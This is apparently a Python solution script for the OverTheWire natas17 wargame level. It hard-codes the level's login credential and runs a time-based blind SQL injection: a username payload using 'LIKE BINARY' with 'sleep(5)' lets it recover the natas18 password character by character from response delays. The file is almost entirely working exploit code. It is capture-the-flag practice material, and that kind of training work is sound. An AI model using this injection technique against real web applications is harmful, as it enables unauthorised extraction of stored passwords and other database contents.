import requests
import time

url = 'http://natas17.natas.labs.overthewire.org/index.php'
username = 'natas17'
password = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'
known_chars = "468DEFGJLNPQUVZagknoquvwx"

session = requests.Session()
session.auth = (username, password)

def test_password(test_password):
    data = {
        'username': f'natas18" AND password LIKE BINARY "{test_password}%" AND sleep(5) -- '
    }
    start_time = time.time()
    response = session.post(url, data=data)
    end_time = time.time()
    return end_time - start_time

def find_next_char(password):
    for char in known_chars:
        test_password_str = password + char
        response_time = test_password(test_password_str)
        print(f"Testing password: {test_password_str} - Response time: {response_time} seconds")
        if response_time >= 5:
            return char
    return None

found_password = ""
while len(found_password) < 32:
    next_char = find_next_char(found_password)
    if next_char is None:
        print("Failed to find next character.")
        break
    found_password += next_char

print("Generated password:", found_password)
